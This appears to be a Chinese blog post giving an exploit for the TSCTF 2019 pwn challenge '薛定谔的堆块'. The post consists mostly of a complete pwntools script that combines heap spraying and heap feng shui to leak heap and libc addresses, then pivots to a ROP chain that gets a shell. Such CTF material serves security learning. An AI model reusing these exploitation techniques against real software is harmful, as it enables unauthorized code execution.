---
title: TSCTF 2019 Pwn 薛定谔的堆块
date: 2020-05-18 00:00:00
categories:
- CTF/Pwn
tags: 堆喷 堆风水
---

> 这是一道堆喷思想和堆风水思想结合的题目

- [堆喷思想在glibc pwn中的应用](https://xz.aliyun.com/t/7189)
- [Glibc PWN“堆风水”应用详解](https://mp.weixin.qq.com/s/h9rUtDXJk0LpGUA1cFFbRA)

以下exp成功率不高，可能几分钟后才能getshell

```python
from pwn import *
context(arch='i386',os='linux')
myelf = ELF("./brother")
io = process(myelf.path)

sla         = lambda delim,data           :  (io.sendlineafter(delim, data))
show        = lambda start,end            :  (sla(">>> ","2"),sla("index : ",str(start)),sla("index : ",str(end)))
delete      = lambda                      :  (sla(">>> ","3"))
hack        = lambda index                :  (sla(">>> ","5"),sla("index : ",str(index)))

def add(size,data,type):
    sla(">>> ","1");sla("note : ",str(size))
    for i in range(16):(sla("data : ",data),sla("type : ",str(type)))

def sub(addr):
    add(100,p32(addr)*20,3)
    delete()
    add(8,'',8)

while 1: 
    try: 
        io = process(myelf.path)
        # update mmap_threshold
        add(0x20000,'x',1);delete()

        # heap spray
        for i in range(0x10):
            add(0x20000,'\x57'*0x1ffff,1)

        # 0x57575757 - 1
        sub(0x57575757);hack(256)

        # leak heap to handler 0x57575757
        point = 0;pos = 0
        for i in range(255):
            show(i,i)
            a = io.recvuntil("1. ")
            if "V" in a:
                log.warn("point: "+str(i))
                point = i
                log.warn("pos: "+str(a.find("V")-12))
                pos = a.find("V")-12
                break

        # leak heap start
        chunk_addr=0x57575757-pos
        big_chunk = int(point/16)
        heap_start = 0

        for i in range(0x10):
            print(i)
            i = i + 1
            addr = chunk_addr + 0x20008*i
            print(hex(addr))
            sub(addr)
            hack(256+i*16)
            show((big_chunk+1)*16,(big_chunk+2)*16-1)
            a = io.recvuntil("1. ")
            if "V" in a:
                log.warn("line: "+str(hex(addr)))
                log.warn("heap_start: "+str(hex(addr-(big_chunk+1)*0x10*0x20008)))
                heap_start = (addr-(big_chunk+1)*0x10*0x20008)
                fastbin = heap_start+0x100*0x20008
                sub(fastbin)
                hack(256+(i+1)*16)
                break

        # leak libc 
        show(256,271)
        io.recvuntil("\xff")
        libc = u32('\xff'+io.recv(3))-0x1b26ff
        log.warn("libc: "+str(hex(libc)))

        for i in range(0x20):
            delete()

        # stack priovt
        magic_gadget1 = 0x00164301
        magic_gadget2 = 0x00100531
        system_offest = 0x3ada0
        binsh_addr = 0x15ba0b
        ropchain = p32(libc + magic_gadget2) + p32(0) + p32(libc+ magic_gadget1) + 'A'*3 + p32(libc + system_offest) + p32(0) + p32(libc + binsh_addr)

        # heap spray heap_start+4
        add(0x1000,p32(heap_start+4)*250,1)
        delete()

        # put ropchain on heap_start
        add(32,ropchain,8)

        # trigger call heap_start+4
        hack(0)
        io.interactive()
    except:
        pass
```